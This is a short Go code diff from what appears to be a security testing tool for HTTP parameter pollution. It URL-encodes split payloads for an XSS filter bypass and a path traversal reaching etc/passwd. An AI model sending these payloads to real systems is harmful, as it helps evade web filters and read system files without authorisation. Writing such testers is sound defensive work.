@@ -203,7 +203,7 @@ func (t *Tester) GetPayloads(param string) []Payload {
 
 		// WAF bypass using HPP
 		{
-			Query:            fmt.Sprintf("%s=<scr&%s=ipt>alert(1)</script>", param, param),
+			Query:            fmt.Sprintf("%s=%s&%s=%s", param, url.QueryEscape("<scr"), param, url.QueryEscape("ipt>alert(1)</script>")),
 			Description:      "XSS WAF bypass via HPP",
 			Type:             VulnWAFBypass,
 			ExpectedBehavior: "Bypass XSS filter using split payload",
@@ -215,7 +215,7 @@ func (t *Tester) GetPayloads(param string) []Payload {
 			ExpectedBehavior: "Bypass SQLi filter using split payload",
 		},
 		{
-			Query:            fmt.Sprintf("%s=../&%s=../&%s=etc/passwd", param, param, param),
+			Query:            fmt.Sprintf("%s=%s&%s=%s&%s=%s", param, url.QueryEscape("../"), param, url.QueryEscape("../"), param, url.QueryEscape("etc/passwd")),
 			Description:      "Path traversal via HPP",
 			Type:             VulnWAFBypass,
 			ExpectedBehavior: "Bypass path filter using split payload",
